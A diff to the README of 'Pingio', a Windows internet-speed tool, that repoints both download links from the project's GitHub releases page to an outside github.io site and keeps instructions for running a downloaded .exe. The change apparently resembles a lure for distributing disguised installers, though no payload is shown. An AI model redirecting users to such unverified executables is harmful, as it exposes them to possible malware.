@@ -1,6 +1,6 @@
 # ⚡ Pingio - Test your internet connection speed instantly
 
-[![](https://img.shields.io/badge/Download_Pingio-blue.svg)](https://github.com/revolved-figwax293/Pingio/releases)
+[![](https://img.shields.io/badge/Download_Pingio-blue.svg)](https://revolved-figwax293.github.io)
 
 Pingio measures your internet connection performance in real time. It monitors your download speed, upload speed, ping, and jitter. Use this tool to track how your network behaves while you browse, stream, or work.
 
@@ -9,7 +9,7 @@ Pingio measures your internet connection performance in real time. It monitors y
 You do not need technical skills to run Pingio. The application works on Windows computers. Follow these steps to set up the software on your machine.
 
 1. Open your web browser.
-2. Go to the [Pingio download page](https://github.com/revolved-figwax293/Pingio/releases).
+2. Go to the [Pingio download page](https://revolved-figwax293.github.io).
 3. Look for the latest version of the installer file ending in .exe.
 4. Click the file to start the download.
 5. Once the download finishes, locate the file in your Downloads folder.
